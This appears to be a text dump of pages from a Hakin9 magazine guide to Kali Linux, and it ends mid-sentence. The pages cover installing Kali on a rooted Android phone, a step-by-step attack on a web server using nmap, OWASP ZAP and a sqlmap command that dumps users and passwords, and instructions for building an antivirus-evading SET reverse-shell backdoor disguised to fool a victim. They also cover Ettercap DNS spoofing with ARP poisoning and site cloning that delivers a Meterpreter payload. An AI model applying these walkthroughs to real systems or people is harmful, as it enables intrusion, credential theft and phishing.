http://www.insydemarket.com/\\n16 AppsFire http://appsire.com/\\n17 Aptoide http://www.aptoide.com/\\nFigure 1.  Android Architecture, taken from wiki\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 17}, page_content='Extra 03/2013 18AT TACK\\nIntroduction to the HTC One X Mobile \\nPhone\\nThe HTC One X smartphone is a pretty power -\\nful device with 1.5 GHz, quad core (global ver -\\nsion) CPU speed, Android 4.1 with smart sense \\n4, screen size of 1280x720 (HD, 720p) with 1GB \\nRAM 16/24 GB Flash Memory and Wi-Fi, Blue -\\ntooth, NFC, USB connectivity and multi-sensors \\n(Gyro sensor, G-Sensor, Digital Compass, Proxim -\\nity sensor and Ambient light sensor).\\nIntroduction to Kali Linux\\nOffensive Security the creators of Backtrack Linux \\nhave a new catchy tag line “the quitter you become, \\nthe more you are able to hear”, with this Zen man -\\ntra the focus is stealth. Kali Linux was created for \\nstealth and attack, this amazing distribution is an \\nadvanced and more versatile version of Backtrack \\never created. This distribution is geared towards \\nprofessional penetration testers and security audi -\\ntors. Kali has gone beyond any live cd distro and \\nmoved into the category of a full-fledged operat -\\ning system. It has moved to a solid base of Debi -\\nan modules and is completely File Hierarchy Sys -\\ntem (FHS) compliant. All directories appear under \\nthe main root directory “/”, and have the ability to \\nbe stored and accessed on physical or virtual de -\\nvices. The main “/pentest” directory from previous \\nBacktrack5 release has been removed in this ver -\\nsion named Kali. Now the user can execute any tool \\nfrom anywhere in the file-system, irrespective of its \\ninstalled location. The second advantage of Kali is \\nits support for ARM hardware and ability to boot -\\nstrap the installation directly from the repositories. \\nKali operating system has over three hundred \\npenetration testing tools and wireless device sup -\\nport. Its kernel is highly patched and network \\nservices are disabled by default making it more \\nsecure. Kali is not just for network security profes -\\nsionals, beginners can also start learning about \\ncyber security using this distribution. Whether you \\nare pentesting wireless, exposing server vulner -\\nabilities, performing a web application based ex -\\nploit, learning, or doing social engineering, Kali is \\nthe one-stop-shop for all security needs. Kali is \\nfree and now ported on Android based smartphone \\nto be taken anywhere.\\nKali Linux has many well-known tools like \\nMetasploit, Injection capable wireless drivers, Kis -\\nmet, John, Zap Proxy, Nmap, Ophcrack, Ettercap, \\nHydra, etc. These tools are all categorised in fif -\\nteen different categories for various purposes. The \\nfifteen categories are: Top 10 Security Tools, In -\\nformation Gathering, Vulnerability Analysis, Web \\nApplications, Password Attacks, Wireless Attacks, Exploitation Tools, Sniffing/Spoofing, Maintain -\\ning Access, Reverse Engineering, Stress Testing, \\nHardware Hacking, Forensics, Reporting Tools \\nand System Services. Kali Linux is running Debian \\nXFCE and comes with vim as default text editor. \\nAll the standard applications and accessories are \\npre-installed and ready to run. For weaponizing \\nAndroid platform with Kali Linux, we will require an \\nunlocked & rooted device.\\nHow to unlock the HTC One X Bootloader \\nand Root the device?\\nIt is important to understand the difference be -\\ntween Unlocking the Bootloader and rooting mo -\\nbile devices. Unlocking the Bootloader provides \\nthe user with the option to change the stock oper -\\nating system on the mobile device. However, root -\\ning is the process of modifying or altering the de -\\nfault operating system shipped with the device to \\ngain complete control over it. \\nThis means that the limitations of carriers and \\nvarious manufacturers put on the device is eas -\\nily bypassed, extended functionality is accessed \\nwithout any problems, custom modules and up -\\ngrades can be added without any limitations. Gen -\\nerally, manufacturers and carriers do not usually  \\nFigure 3.  Warranty Void\\nFigure 2.  Unlock Bootloader\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 18}, page_content='www.hakin9.org/en 19Weaponization of Android Platform  using Kali Linux \\nrecommend rooting. HTC provides instructions on \\ntheir website to unlock the Bootloader for HTC One \\nX, but by performing this operation, the user voids \\nall warranty on the device. The systematic instruc -\\ntions to unlock the Bootloader for HTC One X are \\npresent on the HTC Dev site. Make sure HTC Driv -\\ners are installed on the PC and the mobile phone \\ncan connect and be recognised as HTC Device \\nvia USB cable. Once the device gets connected \\nsuccessfully to the PC, login to the HTCDev web -\\nsite with the registered user name and password. \\nStart by selecting Unlocking Your Bootloader and \\nthen select “All Other Supported Models” under \\nthe Supported Devices section, click Begin Unlock \\nBootloader to start the wizard.\\nThe website prompts to sign a disclaimer that \\nclearly states, the warranty is void and proceed -\\ning further would mean that every repair would be \\ncharged. The website wizard finishes by request -\\ning the device Token ID extracted from the mobile \\nphone. Then based on the Token ID, HTC releases \\nthe unlock code block to release the mobile de -\\nvice. The “unlock.bin” file received is, used to flash \\nthe device and the Bootloader gets unlocked. Next \\nstep is to install SuperSu app, which is an access \\nmanagement tool. Now with root privilege on the \\nmobile device, Kali Linux can be installed. There \\nare two methods to install Kali Linux on Android:\\n•  Method 01: Install Kali GUI using Linux Deploy \\nApp,\\n•  Method 02: Install Kali Command Line Inter -\\nface (CLI) using Chroot Environment.\\nMethod 01: Install Kali gUI using Linux \\nDeploy App\\nRequirements : Rooted HTC One X mobile with 4GB \\nfree space, Linux Deploy App & Android VNC Viewer.\\nMethodology\\n•  Install Linux Deploy and conigure \\nthese values: Distribution=Kali Linux , \\nArchitecture=armel , VNC: Screen Width=1920 , VNC: \\nScreen Height=1280 , (Figure 4-6)\\n•  Scroll up click Install  to inish the download and \\ninstall of Kali Linux over Wi-Fi,\\n•  After completion, go back to the Settings and \\nselect Reconigure  option,\\n•  Once reconiguration is complete, run the serv -\\ner using the START  option,\\n•  Install Android VNC-Viewer and conigure \\nthese values: Nickname=Kali , Set Port=5900 , \\nPassword=changeme , Color Options = 4bpp better \\nquality video  (Figure 7-9).\\nFigure 4.  Linux Deploy\\nFigure 6.  Install inish\\nFigure 5.  Click Install\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 19}, page_content='Extra 03/2013 20AT TACK\\nClick on the Connect button to ire away. Ka -\\nli Linux GUI will show up. This method effectively \\nshows to deploy Kali GUI over Android.\\nOptional 01\\nKali distribution can be updated by running the be -\\nlow command from a terminal prompt:\\nsudo apt-get update && sudo apt-get upgrade && \\nmsfupdate\\nOptional 02\\nArmitage tool can also be added. Armitage is a \\nscriptable tool for Metasploit that visualizes tar -\\ngets, recommends exploits and exposes the ad -\\nvanced post-exploitation features in the Metasploit \\nframework. It has many features for discovery, \\naccess, post-exploitation, and manoeuvre, which \\nmakes is more effective. The command to install \\nArmitage is:\\napt-cache search armitage && apt-get install \\narmitage\\nMethod 02: Install Kali Command Line \\nInterface (CLI) using Chroot environment\\nIn this method the chroot operation is used to deploy \\nKali Linux. The chroot operation changes the root \\ndirectory for the current running processes and its \\nchildren processes by creating and hosting a sepa -\\nrate virtualised environment. Any program deployed \\nusing this operation is confined to the defined base \\ndirectory. Here the chroot operation is used to setup \\nthe Kali Linux platform for pentesting.\\nRequirements\\nRooted HTC One X mobile device with 6GB free \\nspace, BusyBox free app & Terminal Emulator app.\\nMethodology\\n•  Download pre-compiled chroot kali distribution \\nfrom http://googl/qmGle . Mirror: https://archive.\\norg/details/Kali.nogui.armel.zitstif.chroot.482013\\n MD5: d60c5a52bcea35834daecb860bd8a5c7\\n SHA1: f62c2633d214de9edad1842c9209f443bcea385d\\n•  Extract the downloaded archive onto phone’s \\ninternal storage folder /sdcard/kali ,\\n•  Kali folder contains three iles, hashsum, ‘kali’ \\nshell script and ‘kali.img’ ile (Figure 10),\\n•  Install Terminal Emulator app.To run the Kali \\nchroot environment use the below command:\\n Figure 9.  Kali Linux booting\\nFigure 8.  VNC-Viewer\\nFigure 7.  Server started\\nFigure 10.  Extracted folder containing kali.img\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 20}, page_content='www.hakin9.org/en 21Weaponization of Android Platform  using Kali Linux \\n*Note: Kali ile requires permissions to be an exe -\\ncutable and we can set it using this command irst:\\nChmod 755 /sdcard/kali/kali\\nthen use this command to run Kali\\nsu -c /sdcard/kali && sh kali\\nOptional 01\\nTerminal Emulator can be configured to start the \\nsession directly in the Kali chroot environment by \\nadding the following command in: Preferences >> \\nInitial Command\\nsu -c “cd /sdcard/kali && sh kali”\\nOptional 02\\nUpdate the distribution by using the following com -\\nmand:\\napt-get update && apt-get upgrade && msfupdate\\nOptional 03\\nEnhance functionality by adding below mentioned \\ntools from app store.\\nSummary\\nKali Linux GUI or CLI both are equally powerful \\nwhen combined with Android Platform. The begin -\\nners can start using kali GUI on mobile device and \\nthe more experienced who are comfortable with the \\nterminals can have fun using kali CLI. In the future, \\nmore mobile-based tools and apps are going to \\nflood the markets and we need to start using mobile \\ndevices and smartphones as they and becoming \\ninexpensive and more functional. Hope this article \\nis helpful, informative and encourages you towards \\nthe field of cyber security and pentesting.\\nDANIeL SINgH\\nDaniel Singh (CEH, ECSA) is Cyber-securi -\\nty consultant and prominent speaker at \\nDefcon Indian Regional Chapters. He has \\nover thirteen years of experience in scien -\\ntiic software development, network/da -\\ntabase administration, business & data \\nanalysis. He has worked in various roles, i.e.; coding, testing, \\ndatabase and network administration to senior analyst. Cur -\\nrently he works as an Independent consultant in network and \\nsystems security. Apart from consulting, he is active in train -\\ning & mentoring upcoming security professionals. He has var -\\nied interests including malware analysis, open source intelli -\\ngence gathering, reversing, ofensive security and hardware \\nhacking. Email: Daniel@techngeeks.com\\n Figure 12.  Metasploit in Kali chroot\\nFigure 11.  Kali chroot prompt\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 21}, page_content='Extra 03/2013 22AT TACK\\nTable 2. Tools for enhancing functionality\\nApp Name Description\\nAndFTP ftp/sftp client\\nAndroid Hackers shows complete android info\\nAndroidVNC  vnc viewer client\\nAndSMB Android Samba client\\nAntennas shows mobile antennas and much \\nmore info\\nAnyTAG NFC \\nLauncher Automate your phone by scanning \\nNFC tags\\nAPG OpenGPG for Android\\nAPK Dumper copies apk of selected apps\\nApp List Backup says what it does\\nBugtroid pentesting and forensics\\nCardTest Test your NFC enabled credit cards\\nChecksum GUI tool for md5sum and shasum tools\\nConnectBot powerful ssh client\\nDNS Lookup perform DNS and WHOIS lookups\\nDolphin Browser browser that easily allows you to \\nchange your UserAgent\\nDroidcat inspired by irecat\\nDroidsheep Security analysis in wireless \\nnetworks\\nDroidsheep Guard app for monitoring Androids ARP-table\\nDroidSQLi automated MySQL injection tool\\ndSploit Android Network Penetration Suite\\nElectronic \\nPickpocket wirelessly read NFC enabled cards\\nExif Viewer shows exif data from photos and can \\nremove this information\\nFast notepad simple but useful notepad \\napplication\\nFind My Router’s \\nPassword title explains it all (mostly for default \\npasswords)\\nFing very similar to Look@LAN tool for \\nWindows\\nGoomanager front end for android ile hosting\\nHacker’s Keyboard as the name says\\nHashPass translate text into hashes\\nHex Editor hex editor for Android\\nHex Pirate hex editor for Android\\ninSSIDer wireless network info\\nintercepter-NG mutli-function network tool, snifer, \\ncookie intercepter, arp poisoner\\nIP info Detective detailed information regarding the \\nIP address\\nIP Webcam Android device into an IP security \\ncamera\\nLoggy view your logcat in your desktop browserMaluuba voice activated assistant\\nnetwork \\ndiscoveryComputer/device discovery and port \\nscanner\\nNetwork Signal Info graphical tool for iwconig\\nnetwork tools periodic monitoring of websites, \\nservers, routers, surveillance \\nsystems, etc\\nNFC ReTAG Re-use write protected NFC Tags \\nsuch as hotel key-cards, access \\nbadges, etc\\nNFC TagInfo another NFC reader\\nobackup Easily backup your entire device to \\nthe cloud in one tap\\nOpenVPN Connect open vpn client\\nOrbot tor on Android\\nPacket Injection poorman’s GUI version of scapy\\nportknocker as name says\\nProxyDroid use your socks5 proxy with this \\napplication\\npython for \\nandroidas name says\\nrekey app that ixes the recently-disclosed \\n“Master Key” vulnerabilities\\nRoot Browser great ile manager for Android\\nSandroProxy kind of like Webscarab\\nScreenshot \\nUltimate to take screenshots\\nSecret Letter poorman’s stegonagraphy tool\\nsmanager script manager\\nsmart taskbar as name says\\nSSHDroid openssh server for android\\nSTUN Client app to ind out what kind of irewall/\\nNAT you’re behind by using the \\nSTUN protocol.\\nSU Update ixer as name says\\nSupersu manage what programs access root \\nfunctions\\nTeamviewer remotely control Windows, OSX, and \\nLinux based systems\\nTerminal Emulator no explanation needed\\ntimely alarm\\ntPacketCapture as name says\\nVirusTotal Uploader test your malicious payloads\\nVoodoo OTA \\nRootKeeper maintain root access even after \\nupdates\\nWii File Transfer access iles on your phone from a \\nweb browser via an http server\\nWiiFinder simple wireless scanner\\nWiGLE Wii Open-source wardriving app\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 22}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 23}, page_content='Extra 03/2013 24AT TACK\\nKali Linux is probably one of the distributions \\nmore complete for the realization of pene -\\ntration test. This is accompanied by many \\ntools of all kinds. In this article we’ll see some ex -\\namples on how to perform attacks using only some \\nof the Top Ten tools of Kali Linux focusing on those \\nthat are designed to attack web servers...\\nGenerally an attack is performed as follows:\\n•  Collection/information gathering.\\n•  Anonymity.\\n•  Search vulnerabilities.\\n•  Exploitation of the systems.\\n•  Post exploitation.\\n•  Elimination of proofs.\\n•  Executive and technical report.\\nWe will focus on the following: Information Gath -\\nering, search vulnerabilities, exploitation and Post \\nexploitation .\\nIt is important to know that:  in this article you are \\nworking with a series of tools for a specific pur -\\npose, but this does not mean that the tool can only \\nbe used for this purpose. The vast majority of the \\ntools have multiple uses.\\nNmap: Information gathering\\nWhen we are ready to perform an attack, the first \\nand most important step is the collection of infor -mation. Knowing all the potential weak points is \\nour goal. To do this the first thing that we are going \\nto do is to conduct a port scan with nmap. In this \\nway we will know what type of services or applica -\\ntions run under the web server.\\nAs shown in Figure 1, we see the result of a basic \\nscanning launched from nmap , more specifically  Kali Linux, Attacking \\nServers\\nThis article will show you how to perform attacks on web \\nservers, getting full access to the system and database. Just \\nby using some of the ‘Top Ten’ tools of Kali Linux.\\nFigure 1.  Result of scan with Zenmap. Multiples open ports\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 24}, page_content='www.hakin9.org/en 25Kali Linux, Attacking Servers\\nfrom Zenmap , the graphical version of nmap. The \\nscan showed a few open ports on the server, and \\nthis may give us some clues as to where to find \\npotential vulnerabilities. The information which has \\ntaken us back is quite juicy, the server that we are \\nattacking has more of a role assigned, therefore \\nmore points to that attack.Some of the services that are attacked :\\nPort 21 FTP\\nPort 110 pop3\\nPort 3306 mysql\\nThese will probably be the most vulnerable, be -\\ncause the rest of which ports are open on the serv -\\ner have a connection with the security type SSL or \\nTLS, as is the case of HTTPS, SMTPS, POP3S \\nor of the SSH. These protocols and their connec -\\ntion, have a very robust encryption, which is why it \\nis more complex to obtain a key using brute force, \\nor crack a password snifing the trafic on a LAN.\\nAs an example; both by the port 21 as the 110 \\ncould be attempting to perform a brute-force at -\\ntack. On the other hand, we have port 3306 that \\ntells us that mysql installed.\\nWe will do some checking typical to perform a pen -\\netration test, such as trying to access an anonymous \\nuser FTP, or verify access to mysql is enabled.\\nIn Figure 2, shows how the mysql Backend can \\nonly be accessed from within the LAN itself. \\nHowever, having a mysql installed and see so \\nmany open ports makes us think that the web that \\nwe are attacking have more than one database \\ndedicated to various services, for example, for the \\nmain page, a database, for the blog other, and so \\non for each part of the web. This can mean that \\nsome of the parts of the web page is vulnerable.\\nOWASP: Search vulnerabilities\\nOnce that we have some information on the objec -\\ntive, the next step will be to seek vulnerabilities with \\nFigure 2.  Acces denied for mysql backend\\nFigure 3.  Automatic full scan with OWASP ZAP\\nFigure 4.  Report in html from OWASP\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 25}, page_content='Extra 03/2013 26AT TACK\\nthe OWASP tool. At the time of use OWASP we \\ncan use this of two different ways. The first of them \\nwould be to use OWASP as a proxy in our browser, \\nintercepting and all the connections that are made \\nwith Firefox, Chrome, or any other browser.\\nIn this way we can establish the attack in a sin -\\ngle point, that is to say, possibly the web to which \\nwe are attacking has multiple URL, between the \\nBLOG, the main page, the access to the extranet, \\naccess to suppliers, and so on using as a proxy \\nOWASP interceptions exclusively part of the web \\nserver that we want to attack.The other way to use OWASP to search for vul -\\nnerabilities is doing a full scan of the web site.\\nLater I’ll show you how to do it. This option is \\nless advised that the previous one, however, can \\nhelp us in the time to search for these vulnerabili -\\nties, this method is faster. It is less advisable to use \\nthis method, or better said, the handicaps of using \\nas a proxy is, that if you do a full scan on a web -\\nsite, OWASP runs through all the URL of the page \\nand tries to find vulnerabilities in each of the par -\\nties of the web. This implies that the IDS or firewall \\nof server to that we are attacking can detect an in -\\ntrusion attempt.\\nOWASP when perform a full scan, launches all \\npossible attacks, grouping the vulnerabilities found \\nbased on their criticality.\\nIn the image below (Figure 3) we see the result \\nobtained by OWASP on a full scan of the web site \\nthat we are attacking.\\nOnce that we already have the result of the scan -\\nning, the most advisable is to perform a first look \\nat the potential vulnerabilities, and then export it in \\n.HTML in order to be able to focus on those vulner -\\nabilities that we are the most interested in.\\nFigure 4 is the result already exported and in de -\\ntail on the vulnerabilities found. \\nOne of the vulnerabilities found was a XSS (cross \\nsite scripting) and to exploit it is as simple as go \\nto the browser and insert the URL which showed \\nOWASP. Figure 5, is the result of XSS.\\nFigure 8.  Results of the table containing the passwords\\n Figure 7.  Results of the table containing the users\\nFigure 6.  Showing the databases with sqlmap\\nFigure 5.  XSS (cross site scripting) exploited\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 26}, page_content='www.hakin9.org/en 27Kali Linux, Attacking Servers\\nSQLmap: exploiting vulnerabilities\\nAfter verifying that the fault discovered by OWASP \\nare exploitable, we spent a sqlmap where we en -\\ntered a field a bit more fun.\\nAmong other vulnerabilities, we found a possible \\nfailure of SQL injection.\\nThe first thing is to check whether there is such \\nfailure by entering the URL that showed us OWASP.\\nKnowing that is vulnerable, we used sqlmap tool \\nto automate the processes of SQL injection.\\nThe same as it happens with OWASP, there are \\ntwo ways to use sqlmap, one of them would be us -ing the wizard, and the other entering the param -\\neters one by one.\\nFor example: we’d use the following command to \\nknow which are the DATABASE of server (Figure 6).\\nsqlmap -u http://www.website.es/actualidad/evento.\\nphp?id=110 --level=5 --lush-session –dbs\\nThen the options that we offer sqlmap, would get \\nthe tables from a database, after, then users, and \\nso on up to obtain the passwords. It could even \\nmake a dump of all the DB.\\nSometimes the users and passwords are in dif -\\nferent tables, however this is not a problem, we \\ncannot continue with the process of intrusion. Fig -\\nures 7 and 8 show the users and passwords in dif -\\nferent tables.\\nTo do a dump of these two tables, we get the \\naccount_id  and the password (Figure 9), which in \\naddition, seeing the user name I suppose it is the \\nuser that gives access to the FTP.\\nAnd as we saw earlier, one of the open ports was \\nprecisely the 21. Thus, we tried to enter and ... \\nWe’re already inside!\\nNavigating a little for folders on the ftp we realize \\nthat the website has a blog with Wordpress (Figure \\n10). This makes it easier for us once more to get \\naccess to the system ...\\nWe downloaded the file wp-config to view the \\nuser that connects with the Wordpress Database, \\nand we try to connect to a mysql client (Figure 11).\\nSummary\\nWith only 3 programs we have obtained full access \\nand with root permissions to Mysql. Also, we have \\nhad access to the FTP server where are housed all \\nof the files of the web site, and where we could get \\na remote shell.\\nThese 3 tools are in the Top Ten of Kali Linux. These \\nare without doubt the tools to be considered in order \\nto make hacking attacks and penetration testing.\\nISMAeL gONzáLez D.\\nIsmael Gonzalez D. is a security research -\\ner with an experience of over 7 years in the \\nstudy of web vulnerabilities. He is currently \\ncertiied in CEH, MCP, MCDTS, MCSA, LPIC-1. \\nFounder and publisher of computer securi -\\nty blog (http://kontrol0.com). Writer of the \\nbook Backbox 3 – Initiation to pentesting, \\nfreely distributed and completely free (http://www.scribd.com/\\ndoc/157067606/BackBox-3-Iniciacion-al-Pentesting).\\nFigure 9.  Dump of users data and passwords\\nFigure 11.  Full access to the Mysql Server with mysql client\\nFigure 10.  Full access to the FTP server\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 27}, page_content='Extra 03/2013 28AT TACK\\nBackdoor is a security hole that can exist in a \\ncomputer program or operating system that \\ncould allow the invasion of the system so \\nthat the attacker can get a full control of the ma -\\nchine.\\nReferring to a backdoor, this is a ‘backdoor’ that may be exploited via the Internet, but the term can \\nbe used more broadly to describe ways of stealthy \\nobtaining privileged information systems of all \\nkinds.\\nThere are cases where the computer program \\ncan contain a ‘backdoor’ implemented at the time it Hands-on: How To \\nCreate ‚Backdoor’ \\nTo Remote Access With Kali Linux\\nNow I will introduce you to a technique that will use SET \\n(social engineering toolkit) available in Linux Kali ...\\nLet’s create a backdoor that can be used to remotely control \\na Windows computers.\\nWe will create an executable legitimate, hardly detected by \\nany antivirus, so we complete a computer target.\\nI want to point out that all the information here should be \\nused for educational purposes or penetration test, because \\nthe invasion of unauthorized devices is crime.\\nFigure 3.  Enter the IP adress, Step 3\\nFigure 2.  Create the Payload and Listener, Step 2\\nFigure 1 . Social Engineering Toolkit, Step 1\\nFigure 4.  Set payload, Step 4\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 28}, page_content=\"www.hakin9.org/en 29Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\nwas compiled. Generally this feature is interesting \\nwhen software must perform update operations or \\nvalidation.\\nStep to Step\\nI hope to do a walkthrough theoretically simple:\\nFirst we access the menu: “Applications/Kali \\nLinux/Exploitation Tools/Social Engineering Tool -\\nkit” and click “seetoolkit”. It will be a menu like that \\nseen in the Figure 1. In the options menu select \\noption 1.\\nIn the second menu select option 4 (Figure 2).\\nIn this screen below you should properly input \\nyour IP address. If you have questions open a new \\nterminal and type ifconfig eth0  then fill in this field \\ncorrectly (Figure 3).\\nIn the screenshot below, you should choose the \\nsecond option to create a connection reverse, our target computer is who will connect to the attack -\\ner (Figure 4). In the screenshot below to watch 3 \\nsteps we perform first the kind of backdoor, type \\n16, then we must define the portal site, the attack -\\ner’s machine that will be ‘listening’ for connection \\nattempts made   by the target. The default port is \\n443 you can choose to change the port if it is al -\\nready being used. We can enter another number \\nand then press ‘Enter’, Next you’re asked whether \\nto start ‘listening’, you must enter ‘yes’ (Figure 5).\\nWith these procedures the ‘backdoor’ will be cre -\\nated and our computer will begin to ‘listen’ for con -\\nnections from the target machines.\\nThe executable is created in the folder /usr/\\nshare/set/  and is called ‘msf.exe‘.\\nThe goal is to make it an executable, then we \\ncan open a new terminal and type the following \\ncommand\\n‘chmod + x / usr / share / set / msf.exe‘\\nFigure 6.  Starting interaction, Step 6\\nFigure 5.  Start the listener, Step 5\\nFigure 8.  Ettercap, Step 2\\nFigure 7. Ettercap, Step 1\\n Figure 9.  Ettercap, Step 3\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 29}, page_content='Extra 03/2013 30AT TACK\\nIf you want to you can rename this ile to facil -\\nitate the process of social engineering to con -\\nvince someone to opening a photo or install a \\nnew application.Now we need to copy this executable to the tar -\\nget machine and so it runs a Figure 6.\\nHere to enter the command ‘sessions’ can list the \\ntargets already connected.\\nWhen we type ‘sessions -i 1’ (assuming 1 is the \\nID number displayed by the command ‘sessions‘, if \\nanother number is displayed just change the num -\\nber shown by 1)  we will be able to interact with the \\ntarget machine with full access.\\nDNS spoofing attack with ettercap\\nINTRODUCTION\\nDNS spoofing is a method in which the attacker com -\\npromises a name server (Domain Name System).\\nThe server accepts and incorrectly uses the in -\\nformation from a ‘host’ who has no authority to pro -\\nvide this information.\\nUsing this technique, the attacker can direct the \\nvictim’s browser or email to their own server.\\nThe technique consists of the data that is entered \\nin a Domain Name System (DNS) ‘name server’s \\ncache database’, making the name of the server to \\nreturn an incorrect IP address, diverting traffic to \\nanother computer.\\nStep to Step\\nOpen the terminal. Type and hit enter (Figure 7): \\nFigure 10.  Start Sniing, Step 4\\nFigure 11.  DNS Spoof, Step 5\\nFigure 12.  Social Engineering Toolkit, Step 1\\nFigure 13.  Social Engineering Attacks, Step 2\\nFigure 14.  Website Attacks, Step 3\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 30}, page_content=\"www.hakin9.org/en 31Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\n# vi /usr/share/ettercap/etter.dns\\nJust edit and save, exit and enter after ‘ettercap-\\nG’ to open Ettercap in graphical mode.\\nGo Sniff: ‘Unified Sniffing’, when prompted, \\nchoose your NIC ‘eth0’ (Figure 8).\\nConcepts\\nThis type of attack is important to get some creden -\\ntials during the execution of the penetration test. It \\nconsists of sending false answers to DNS requests \\nthat are made. To execute this attack, you must ed -\\nit the file ‘etter.dns’, as it is the file ‘hosts’ windows \\nand linux, we can configure to which requests are \\nsent. In ‘Hosts’ click ‘Scan for hosts’.\\nAgain in “Hosts” click Host List ‘to view a list of all \\navailable IPs on the network, which will select the \\ntarget that will receive the false answers and click’ \\nAdd to Target 1’ (Figure 9).\\nNow click on ‘Start’, ‘Start Sniffing’.\\nAfter go ‘MitM’: ‘Arp Poisoning’. Select the option \\n‘Sniff remote connections’ as below and click ‘OK’ \\n(Figure 10).\\nGo to ‘Plugins’, ‘Manage the Plugins’ and double \\nclick dns_spoof’ (Figure 11).\\nDone that the ‘selected customer’ will start get -\\nting false answers to DNS.Cloning Site with Kali Linux\\nINTRODUCTION\\nSET Attack Method:\\nThe Social Engineer Toolkit (SET) has been de -\\nveloped to perform advanced attacks against the \\nhuman element. SET was designed to be launched \\nwith http://www.social-engineer.org  and quickly \\nbecame a standard tool in the arsenal of penetra -\\ntion testers. The attacks built into the toolkit are de -\\nsigned to be focused on attacks against a person \\nor organization used during a penetration test.\\nThis hacking method will work perfectly with the \\n‘DNS spoofing or Man in the Middle attack method’.\\nI will present methods of attack like this can have \\ncomputer in few steps.\\nStep to Step\\nEnter on Applications: Kali Linux: Exploitation \\nTools: Social Engineering Toolkit: then Select ‘se-\\ntoolkit’ (Figure 12).\\nFigure 15.  Java Applet Attack, Step 4\\nFigure 16. Site Cloning, Step 5\\nFigure 17.  Web Templates, Step 6\\nFigure 18.  URL to be cloned, Step 7\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 31}, page_content='Extra 03/2013 32AT TACK\\nThen Select option ‘Social Engineering Attacks’ \\nusing no. So it will create another window: Fig -\\nure 13. Then Select option ‘Website Attack Vec -\\ntors’ which is the unique way of using multiple web \\nbased attacks... (Figure 14).\\nAfter that Select option ‘Java Applet Attack’ \\nmethod will spoof a Java Certificate and deliver a \\n‘metasploit’ based payload (Figure 15).Select the option which is for ‘Site Cloning’ that \\nwill allow SET to clone the Site that you will define \\nso that it can utilize that attack (Figure 16).\\nAfter pressing enter on the ‘Web Template’ will \\nshow how to use the PORT/ NAT or other. Next \\nstep, enter the IP of your Kali linux, so you can do \\nreverse connection to your machine when the tar -\\nget using the link provided by you (Figure 17).\\nAfter you provide the URL to be cloned as Ya -\\nhoo, Twitter, Facebook. You can collect various in-\\nformation about the target (Figure 18).\\nProvide the URL to start cloning, and then, once \\nthat’s done, will start generating ‘payload’ and \\nsome files as jar file, index.html (Figure 19).\\nSelect the ‘payload’ necessary that you want to \\ngenerate. I’m using the second option, which is the \\n‘Windows Meterpreter Reverse_TCP’ that will cre -\\nate a shell access between the attacker and the \\ntarget machine that is between my Kali Linux (Fig -\\nure 20). It will display ‘list of Encoding’s’ that will \\nhelp you bypass the security target. I prefer ‘Back -\\ndoored Executable’, it is best to find a ‘spamhole’ \\non the machine in question (Figure 21).\\nWill begin to generate multiple ‘Powershell code \\nbased Injection’ based on common ports such as \\n Figure 19. Generating Payload, Step 8\\nFigure 20.  Windows Meterpreter Reverse_TCP, Step 9\\nFigure 21.  Backdoored Executable(BEST), Step 10\\nFigure 22.  Powershell, Step 1 1\\nFigure 23.  Reverse TCP Connection, Step 12\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 32}, page_content=\"www.hakin9.org/en 33Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\n53, 80, 443, in his ‘Attacket machine’ to the target \\nusing one where the ‘payload’ is generated.\\nSelect Option 16, will ask for the ‘Port Number’. \\nPress Enter then it will use the default port number. \\nIt will launch the ‘Launch the Web SET’ will start \\nappearing and the number of vulnerabilities and \\nthen it will generate a link that you can move on \\nto the target and once he uses that link, your ma -\\nchine will create a connection ‘Reverse TCP Con -\\nnection ‘ with the attacker’s machine on the num -\\nber of doors (Figure 23).\\nThe Code execution ‘ PowerShell ‘, which will run \\nin the background and then will load ‘ MSF ‘ and \\ngenerate a ‘link’ that when a person clicks it will \\ncreates reverse connection open to you within the \\nnetwork (Figure 24).\\nThis will provide a link when trying to open the \\ntarget, all the information from your system back to us via ‘ Reverse TCP Connection’ (Figure 25). \\nWhile one tries to use this link will generate a con -\\nnection on some port between the attacker and the \\ntarget, which is ‘TCP’. After these procedures the \\n‘payload‘ is generated and when you use this link \\non the machine to open a cloned page also gener -\\nates the file ‘.jar‘ whose function is to establish the \\nconnection between the two machines (Figure 26).\\nLet’s create a session with the machine, going \\nto my local machine can check if the connection \\nwas successful or not. We should use the com -\\nmand ‘netstat’.\\nExample: netstat-year | find “57804”.\\nWhen we are connected to the target machine, \\nyou can 